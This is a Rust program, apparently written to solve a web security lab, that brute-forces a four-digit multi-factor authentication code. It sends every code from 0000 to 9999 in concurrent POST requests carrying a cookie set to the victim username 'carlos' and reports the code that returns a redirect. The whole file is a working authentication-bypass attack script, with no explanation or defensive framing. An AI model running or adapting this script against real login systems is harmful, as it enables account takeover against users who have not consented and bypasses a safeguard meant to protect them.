use reqwest::{Client, header::{HeaderMap, HeaderValue, CONTENT_TYPE}};
use futures::stream::{FuturesUnordered, StreamExt};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("Hello World!");
    let client = Client::builder()
        .cookie_store(true)
        .http2_prior_knowledge()
        .build()?;

    let url = "<URL>";

    let mut headers = HeaderMap::new();
    headers.insert("Host", HeaderValue::from_static("<URL>"));
    headers.insert("Cookie", HeaderValue::from_static("verify=carlos"));
    headers.insert("User-Agent", HeaderValue::from_static("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0"));
    headers.insert("Accept", HeaderValue::from_static("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"));
    headers.insert("Accept-Language", HeaderValue::from_static("en-US,en;q=0.5"));
    headers.insert("Accept-Encoding", HeaderValue::from_static("gzip, deflate, br"));
    headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/x-www-form-urlencoded"));
    headers.insert("Origin", HeaderValue::from_static("<URL>"));
    headers.insert("Referer", HeaderValue::from_static("<URL>"));
    headers.insert("Upgrade-Insecure-Requests", HeaderValue::from_static("1"));
    headers.insert("Sec-Fetch-Dest", HeaderValue::from_static("document"));
    headers.insert("Sec-Fetch-Mode", HeaderValue::from_static("navigate"));
    headers.insert("Sec-Fetch-Site", HeaderValue::from_static("same-origin"));
    headers.insert("Sec-Fetch-User", HeaderValue::from_static("?1"));
    headers.insert("Sec-Gpc", HeaderValue::from_static("1"));
    headers.insert("Priority", HeaderValue::from_static("u=0, i"));
    headers.insert("Te", HeaderValue::from_static("trailers"));

    let concurrency_limit = 20;
    let mut tasks = FuturesUnordered::new();

    for code in 0..=9999 {
        let client = client.clone();
        let headers = headers.clone();
        let url = url.to_string();
        let code_str = format!("{:04}", code);

        tasks.push(tokio::spawn(async move {
            let body = format!("mfa-code={}", code_str);

            match client.post(&url)
                .headers(headers)
                .body(body)
                .send()
                .await
            {
                Ok(response) => {
                    if response.status() == 302 {
                        println!("✅ Correct code: {} (Status: 302)", code_str);
                    }
                }
                Err(err) => {
                    eprintln!("Error with code {}: {}", code_str, err);
                }
            }
        }));

        if tasks.len() >= concurrency_limit {
            if let Some(task) = tasks.next().await {
                task?;
            }
        }
    }

    
    while let Some(task) = tasks.next().await {
        task?;
    }

    Ok(())
}